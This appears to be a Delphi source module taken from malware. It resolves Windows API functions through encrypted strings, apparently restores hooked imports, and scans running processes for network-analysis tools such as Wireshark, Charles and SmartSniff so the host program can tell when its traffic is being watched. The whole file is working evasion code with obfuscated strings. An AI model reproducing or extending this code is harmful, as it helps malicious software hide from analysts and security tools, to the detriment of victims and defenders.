unit AntiSniffModule;

interface

uses Windows, TlHelp32, ImportsDoctor, MemStrTools, commonDefs;

type
	CreateToolhelp32SnapshotPROTO = function (dwFlags, th32ProcessID: DWORD): THandle stdcall;
	Process32FirstPROTO = function (hSnapshot: THandle; var lppe: TProcessEntry32): BOOL stdcall;
	Process32NextPROTO = function (hSnapshot: THandle; var lppe: TProcessEntry32): BOOL stdcall;

	AntiSniffer = class
		kernel32: Cardinal;
		lpCreateToolhelp32Snapshot: CreateToolhelp32SnapshotPROTO;
		lpProcess32First: Process32FirstPROTO;
		lpProcess32Next: Process32NextPROTO;
		public
			constructor Create;
			function FindBads():Boolean;
	end;
	
var
	Traffic: AntiSniffer;

implementation

constructor AntiSniffer.Create();
begin
	kernel32 := GetModuleHandle(PChar(Tools.Crypt(COMDEF_LIBRARY_KERNEL, false)));
	if kernel32 = 0 then kernel32 := LoadLibrary(PChar(Tools.Crypt(COMDEF_LIBRARY_KERNEL, false)));
	
	@lpCreateToolhelp32Snapshot := GetProcAddress(kernel32, PChar(Tools.Crypt(COMDEF_FUNCTION_CREATETLHELP32, false)));
	@lpProcess32First := GetProcAddress(kernel32, PChar(Tools.Crypt(COMDEF_FUNCTION_PROC32FIRST_ANSI, false)));
	@lpProcess32Next := GetProcAddress(kernel32, PChar(Tools.Crypt(COMDEF_FUNCTION_PROC32NEXT_ANSI, false)));
end;

function AntiSniffer.FindBads():Boolean;
var
	ContinueLoop: BOOL;
	FSnapshotHandle: THandle;
	FProcessEntry32: TProcessEntry32;
begin
	Doctor.CheckAndRepair(6);
	Doctor.CheckAndRepair(7);
	Doctor.CheckAndRepair(8);
	Doctor.CheckAndRepair(9);
	FSnapshotHandle := lpCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
	ContinueLoop := lpProcess32First(FSnapshotHandle, FProcessEntry32);
	Result := false;
	
	while Integer(ContinueLoop) <> 0 do
	begin
	
		Result := True;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_WIRESHARK, false)))=0 then break;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_ANALYZER7, false)))=0 then break;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_CHARLES, false)))=0 then break;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_SMSNIFF, false)))=0 then break;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_MESANAL, false)))=0 then break;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_SMARTSNIFF, false)))=0 then break;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_ANALYZER6, false)))=0 then break;
		if lstrcmp(FProcessEntry32.szExeFile, PChar(Tools.Crypt(COMDEF_PROCNAME_NETTRAFVW, false)))=0 then break;
		Result := false;
		
		ContinueLoop := lpProcess32Next(FSnapshotHandle, FProcessEntry32);
	end;
	CloseHandle(FSnapshotHandle);
	Doctor.WriteBack(9);
	Doctor.WriteBack(8);
	Doctor.WriteBack(7);
	Doctor.WriteBack(6);
end;

end.